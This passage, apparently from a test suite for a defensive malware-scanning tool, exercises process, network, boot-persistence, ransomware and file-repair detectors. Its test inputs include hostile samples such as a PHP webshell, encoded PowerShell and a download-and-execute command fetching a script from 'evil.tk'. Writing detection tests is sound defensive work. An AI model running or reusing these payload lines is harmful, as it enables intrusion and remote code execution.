      const r = P.analyzeProcess({ pid: 4, name: 'setup.exe', path: 'C:\\Users\\u\\AppData\\Local\\Temp\\setup.exe' });
      assert(r.findings.some((f) => f.includes('temp')), r.findings.join('|'));
      assert(r.risk !== 'clean');
    }],
    ['pro: process — office spawning non-standard child', () => {
      const { sandbox } = makeSandbox();
      loadScript('processguard.js', sandbox);
      const P = sandbox.ProcessGuard;
      const r = P.analyzeProcess({ pid: 5, name: 'updater.exe', path: 'C:\\Users\\u\\AppData\\Roaming\\updater.exe', parentName: 'WINWORD.EXE' });
      assert(r.findings.some((f) => f.includes('office/browser spawned')), r.findings.join('|'));
    }],
    ['pro: process — scanProcesses summary counts', () => {
      const { sandbox } = makeSandbox();
      loadScript('processguard.js', sandbox);
      const P = sandbox.ProcessGuard;
      const { summary } = P.scanProcesses([
        { pid: 1, name: 'chrome.exe', path: 'C:\\Chrome\\chrome.exe' },
        { pid: 2, name: 'mimikatz.exe', path: 'C:\\Temp\\m.exe' },
        null, 'junk',
      ]);
      assert(summary.total === 2 && summary.malicious >= 1, JSON.stringify(summary));
    }],
    ['pro: process — normalizeProc rejects junk', () => {
      const { sandbox } = makeSandbox();
      loadScript('processguard.js', sandbox);
      const P = sandbox.ProcessGuard;
      assert(P.normalizeProc(null) === null);
      assert(P.normalizeProc({}) === null);
      assert(P.analyzeProcess(null) === null);
    }],
    // ---------- NetGuard ----------
    ['pro: net — C2 port from powershell is malicious', () => {
      const { sandbox } = makeSandbox();
      loadScript('netguard.js', sandbox);
      const N = sandbox.NetGuard;
      const r = N.analyzeConn({ pid: 1, process: 'powershell.exe', local: '192.168.1.5', localPort: 50000, remote: '45.33.22.11', remotePort: 4444, state: 'established' });
      assert(r.risk === 'malicious' && r.score >= 70, r.risk + ' ' + r.score);
      assert(r.findings.some((f) => f.includes('C2 port')));
    }],
    ['pro: net — suspicious TLD flagged', () => {
      const { sandbox } = makeSandbox();
      loadScript('netguard.js', sandbox);
      const N = sandbox.NetGuard;
      const r = N.analyzeConn({ pid: 1, process: 'chrome.exe', remote: 'evil.tk', remotePort: 443, state: 'established' });
      assert(r.findings.some((f) => f.includes('suspicious TLD')), r.findings.join('|'));
    }],
    ['pro: net — private IP not flagged', () => {
      const { sandbox } = makeSandbox();
      loadScript('netguard.js', sandbox);
      const N = sandbox.NetGuard;
      const r = N.analyzeConn({ pid: 1, process: 'app.exe', remote: '192.168.1.10', remotePort: 8080, state: 'established' });
      assert(r.risk === 'clean', r.risk + ' ' + r.score);
    }],
    ['pro: net — known-good host clean', () => {
      const { sandbox } = makeSandbox();
      loadScript('netguard.js', sandbox);
      const N = sandbox.NetGuard;
      const r = N.analyzeConn({ pid: 1, process: 'update.exe', remote: 'windowsupdate.com', remotePort: 443, state: 'established' });
      assert(r.score === 0 && r.risk === 'clean', r.risk + ' ' + r.score);
    }],
    ['pro: net — exe from temp connecting out flagged', () => {
      const { sandbox } = makeSandbox();
      loadScript('netguard.js', sandbox);
      const N = sandbox.NetGuard;
      const r = N.analyzeConn({ pid: 1, process: 'C:\\Users\\u\\AppData\\Local\\Temp\\x.exe', remote: '1.2.3.4', remotePort: 443, state: 'established' });
      assert(r.risk !== 'clean' && r.findings.length >= 2, r.risk + ' ' + r.findings.join('|'));
    }],
    ['pro: net — scanConnections summary', () => {
      const { sandbox } = makeSandbox();
      loadScript('netguard.js', sandbox);
      const N = sandbox.NetGuard;
      const { summary } = N.scanConnections([
        { process: 'a.exe', remote: '1.1.1.1', remotePort: 4444, state: 'established' },
        { process: 'b.exe', remote: '8.8.8.8', remotePort: 53, state: 'established' },
      ]);
      assert(summary.total === 2 && summary.malicious >= 1, JSON.stringify(summary));
    }],
    ['pro: net — hostOf parses addr:port and brackets', () => {
      const { sandbox } = makeSandbox();
      loadScript('netguard.js', sandbox);
      const N = sandbox.NetGuard;
      assert(N.hostOf('1.2.3.4:443') === '1.2.3.4');
      assert(N.hostOf('[::1]:8080') === '::1');
      assert(N.isPrivate('10.0.0.1') && N.isPrivate('192.168.1.1') && !N.isPrivate('8.8.8.8'));
    }],
    // ---------- Scheduler ----------
    ['pro: scheduler add/toggle/remove', () => {
      const { sandbox } = makeSandbox();
      loadScript('scheduler.js', sandbox);
      const S = sandbox.Scheduler;
      const j = S.addJob({ name: 'Daily', type: 'quick', interval: 'daily' });
      assert(j.id && j.enabled && j.nextRun > Date.now());
      assert(S.list().length === 1);
      assert(S.toggleJob(j.id, false) === true);
      assert(S.list()[0].enabled === false);
      assert(S.dueJobs().length === 0, 'paused job not due');
      assert(S.toggleJob(j.id, true) === true);
      assert(S.removeJob(j.id) === true);
      assert(S.list().length === 0);
    }],
    ['pro: scheduler dueJobs + markRun reschedules', () => {
      const { sandbox } = makeSandbox();
      loadScript('scheduler.js', sandbox);
      const S = sandbox.Scheduler;
      const j = S.addJob({ name: 'H', type: 'quick', interval: 'hourly' });
      S.setNextRun(j.id, Date.now() - 1000);
      const due = S.dueJobs();
      assert(due.length === 1, 'job due, got ' + due.length);
      S.markRun(j.id);
      assert(S.dueJobs().length === 0, 'rescheduled');
      assert(S.list()[0].nextRun > Date.now());
      assert(S.list()[0].lastRun > 0);
    }],
    ['pro: scheduler rejects invalid interval/type', () => {
      const { sandbox } = makeSandbox();
      loadScript('scheduler.js', sandbox);
      const S = sandbox.Scheduler;
      const j = S.addJob({ name: 'x', interval: 'yearly', type: 'weird' });
      assert(j.interval === S.INTERVALS.daily, 'falls back to daily');
      assert(j.type === 'custom');
      assert(S.addJob(null) === null);
    }],
    ['pro: scheduler nextRunLabel formats', () => {
      const { sandbox } = makeSandbox();
      loadScript('scheduler.js', sandbox);
      const S = sandbox.Scheduler;
      const now = Date.now();
      assert(S.nextRunLabel({ enabled: false, nextRun: now }, now) === 'paused');
      assert(S.nextRunLabel({ enabled: true, nextRun: now + 5000 }, now) === 'due now');
      assert(S.nextRunLabel({ enabled: true, nextRun: now + 3600000 }, now) === 'in 1 h');
      assert(S.nextRunLabel({ enabled: true, nextRun: now + 86400000 }, now) === 'in 1 d');
    }],
    // ---------- RansomGuard ----------
    ['pro: ransom — crypto extension detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('ransomware.js', sandbox);
      const R = sandbox.RansomGuard;
      assert(R.isCryptoExt('photo.jpg.locked') === true);
      assert(R.isCryptoExt('photo.jpg.wcry') === true);
      assert(R.isCryptoExt('photo.jpg') === false);
    }],
    ['pro: ransom — note names detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('ransomware.js', sandbox);
      const g = sandbox.RansomGuard.createGuard();
      assert(g.isRansomNote('HOW_TO_DECRYPT.txt') === true);
      assert(g.isRansomNote('readme.html') === true);
      assert(g.isRansomNote('notes.txt') === false);
    }],
    ['pro: ransom — burst trips alert', () => {
      const { sandbox } = makeSandbox();
      loadScript('ransomware.js', sandbox);
      const g = sandbox.RansomGuard.createGuard();
      for (let i = 0; i < sandbox.RansomGuard.BURST_THRESHOLD; i++) {
        g.recordRename({ path: '/d/f' + i, name: 'f' + i, newName: 'f' + i + '.locked' });
      }
      assert(g.state.tripped === true);
      const a = g.assess();
      assert(a.risk === 'high' && a.score === 80, a.risk + ' ' + a.score);
    }],
    ['pro: ransom — note file trips critical', () => {
      const { sandbox } = makeSandbox();
      loadScript('ransomware.js', sandbox);
      const g = sandbox.RansomGuard.createGuard();
      g.recordNewFile({ path: '/d/HOW_TO_DECRYPT.txt', name: 'HOW_TO_DECRYPT.txt' });
      assert(g.state.tripped === true);
      const a = g.assess();
      assert(a.risk === 'high' && a.notes === 1, JSON.stringify(a));
    }],
    ['pro: ransom — reset clears state', () => {
      const { sandbox } = makeSandbox();
      loadScript('ransomware.js', sandbox);
      const g = sandbox.RansomGuard.createGuard();
      g.recordNewFile({ path: '/d/HOW_TO_DECRYPT.txt', name: 'HOW_TO_DECRYPT.txt' });
      g.reset();
      assert(g.state.tripped === false && g.state.events.length === 0);
    }],
    ['pro: ransom — status shape', () => {
      const { sandbox } = makeSandbox();
      loadScript('ransomware.js', sandbox);
      const g = sandbox.RansomGuard.createGuard();
      g.addProtectedDir('/home/u/Documents');
      const st = g.status();
      assert(st.enabled === true && st.protectedDirs.includes('/home/u/Documents'));
      assert(st.assessment.risk === 'clean');
    }],
    // ---------- Repair ----------
    ['pro: repair — php webshell removed', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('repair.js', sandbox);
      const R = sandbox.Repair;
      const dirty = '<?php echo "ok"; eval($_POST["c"]); ?>';
      const { text, changed, removed } = R.repairText(dirty);
      assert(changed === true && !text.includes('eval($_POST'), text);
      assert(removed.includes('php webshell block'));
    }],
    ['pro: repair — powershell -enc removed', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('repair.js', sandbox);
      const R = sandbox.Repair;
      const dirty = 'Write-Host hi; powershell -enc ' + 'A'.repeat(60);
      const { text, changed } = R.repairText(dirty);
      assert(changed && !text.includes('-enc'), text);
    }],
    ['pro: repair — js eval(atob) removed', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('repair.js', sandbox);
      const R = sandbox.Repair;
      const { text, changed } = R.repairText('var x = 1; eval(atob("AAAA"));');
      assert(changed && !text.includes('eval(atob'), text);
    }],
    ['pro: repair — clean file unchanged', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('repair.js', sandbox);
      const R = sandbox.Repair;
      const { changed, removed } = R.repairText('hello world\n');
      assert(changed === false && removed.length === 0);
    }],
    ['pro: repair — canRepair rejects binaries/huge', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('repair.js', sandbox);
      const R = sandbox.Repair;
      assert(R.canRepair('a.exe', strBytes('MZ')).ok === false);
      assert(R.canRepair('a.js', new Uint8Array(6 * 1024 * 1024)).ok === false);
      assert(R.canRepair('a.js', strBytes('x')).ok === true);
    }],
    ['pro: repair — bytes roundtrip', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('repair.js', sandbox);
      const R = sandbox.Repair;
      const dirty = strBytes('<?php eval($_GET["x"]); ?>ok');
      const { bytes, changed } = R.repairBytes(dirty);
      assert(changed === true);
      assert(R.bytesToText(bytes).includes('ok'));
    }],
    // ---------- Updater ----------
    ['pro: updater — version compare', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('updater.js', sandbox);
      const U = sandbox.Updater;
      assert(U.compareVersions('2025.11.01-1', '2025.10.26-1') > 0);
      assert(U.compareVersions('2025.10.26-2', '2025.10.26-1') > 0);
      assert(U.compareVersions('2025.10.26-1', '2025.10.26-1') === 0);
      assert(U.compareVersions('bad', '2025.10.26-1') === 0);
      assert(U.parseVersion('2025.10.26-1').n === 1);
      assert(U.parseVersion('nope') === null);
    }],
    ['pro: updater — needsUpdate detects newer', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('updater.js', sandbox);
      const U = sandbox.Updater;
      const r = U.needsUpdate({ version: '2099.01.01-1', signatures: 500, sha256: 'ab'.repeat(32) });
      assert(r.update === true && r.available === '2099.01.01-1');
      const r2 = U.needsUpdate({ version: '2000.01.01-1' });
      assert(r2.update === false);
      assert(U.needsUpdate(null).update === false);
      assert(U.needsUpdate({ version: 'garbage' }).update === false);
    }],
    ['pro: updater — recordCheck updates version', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('updater.js', sandbox);
      const U = sandbox.Updater;
      U.stageUpdate('2099.01.01-1');
      U.recordCheck('ok');
      const s = U.status();
      assert(s.currentVersion === '2099.01.01-1' && s.pendingVersion === '');
      assert(s.lastResult === 'ok' && s.lastCheck > 0);
    }],
    ['pro: updater — autoUpdate toggle', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('updater.js', sandbox);
      const U = sandbox.Updater;
      U.setAutoUpdate(false);
      assert(U.status().autoUpdate === false);
      U.setAutoUpdate(true);
      assert(U.status().autoUpdate === true);
    }],
    // ---------- BootGuard ----------
    ['pro: boot — suspicious Run value flagged', () => {
      const { sandbox } = makeSandbox();
      loadScript('bootguard.js', sandbox);
      const B = sandbox.BootGuard;
      const r = B.analyzeEntry({ location: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', name: 'Updater', value: 'powershell -enc ' + 'A'.repeat(60) });
      assert(r.risk !== 'clean', r.risk);
      assert(r.findings.length >= 1, r.findings.join('|'));
    }],
    ['pro: boot — download-exec URL flagged hard', () => {
      const { sandbox } = makeSandbox();
      loadScript('bootguard.js', sandbox);
      const B = sandbox.BootGuard;
      const r = B.analyzeEntry({ location: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', name: 'Svc', value: 'cmd /c powershell -c "iwr http://evil.tk/x.ps1|iex"' });
      assert(r.score >= 50, 'score ' + r.score);
      assert(r.findings.some((f) => f.includes('download-and-execute')), r.findings.join('|'));
    }],
    ['pro: boot — known app is clean', () => {
      const { sandbox } = makeSandbox();
      loadScript('bootguard.js', sandbox);
      const B = sandbox.BootGuard;
      const r = B.analyzeEntry({ location: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', name: 'SecurityHealth', value: '%windir%\\system32\\SecurityHealthSystray.exe' });
      assert(r.risk === 'clean', r.risk + ' ' + r.score);
    }],
    ['pro: boot — AppData hidden exe flagged', () => {
      const { sandbox } = makeSandbox();
      loadScript('bootguard.js', sandbox);
      const B = sandbox.BootGuard;
      const r = B.analyzeEntry({ location: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', name: 'OneDrive', value: 'C:\\Users\\u\\AppData\\Roaming\\abc123\\update.exe' });
      assert(r.findings.some((f) => f.includes('AppData') || f.includes('persistence')), r.findings.join('|'));
    }],
    ['pro: boot — script in Startup folder flagged', () => {
      const { sandbox } = makeSandbox();
      loadScript('bootguard.js', sandbox);
      const B = sandbox.BootGuard;
      const r = B.analyzeEntry({ location: 'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', name: 'helper.vbs', value: 'C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.vbs', type: 'startup-folder' });
      assert(r.findings.some((f) => f.includes('Startup folder')), r.findings.join('|'));
    }],
    ['pro: boot — masquerading name flagged', () => {
      const { sandbox } = makeSandbox();
      loadScript('bootguard.js', sandbox);
      const B = sandbox.BootGuard;
      const r = B.analyzeEntry({ location: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', name: 'svchost', value: 'C:\\Users\\u\\AppData\\Local\\Temp\\svchost.exe' });
      assert(r.findings.some((f) => f.includes('masquerading')), r.findings.join('|'));
    }],
    ['pro: boot — scanEntries summary', () => {
      const { sandbox } = makeSandbox();
      loadScript('bootguard.js', sandbox);
      const B = sandbox.BootGuard;
      const { summary } = B.scanEntries([
        { location: 'HKLM\\...\\Run', name: 'SecurityHealth', value: '%windir%\\system32\\SecurityHealthSystray.exe' },
        { location: 'HKCU\\...\\Run', name: 'X', value: 'powershell -enc ' + 'A'.repeat(60) },
        null,
      ]);
      assert(summary.total === 2 && summary.flagged.length >= 1, JSON.stringify(summary));
    }],
    // ---------- .diff fix ----------
    ['pro: .diff/.patch files are source context', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('fix.diff', strBytes('--- a/app.py\n+++ b/app.py\n+ransom note test'), 60, '/home/x/fix.diff');
      assert(r.verdict === 'clean', '.diff -> clean, got ' + r.verdict);
      const r2 = Sc.analyzeBytes('x.patch', strBytes('Invoke-WebRequest http://x | iex'), 40, '/home/x/x.patch');
      assert(r2.verdict === 'clean', '.patch -> clean, got ' + r2.verdict);
    }],
  ];
  let pass = 0, fail = 0;
  for (const [name, fn] of T) {
    try { await fn(); pass++; console.log('  ✔ ' + name); }
    catch (e) { fail++; console.log('  ✕ ' + name + ': ' + e.message); }
  }
  console.log(`\n[audit pro-modules] ${pass} passed, ${fail} failed`);
  if (fail) process.exit(1);
  console.log('[audit pro-modules] all pro-module tests passed ✔');
}

setTimeout(() => { auditProModules().catch((e) => { console.error(e); process.exit(1); }); }, 500);
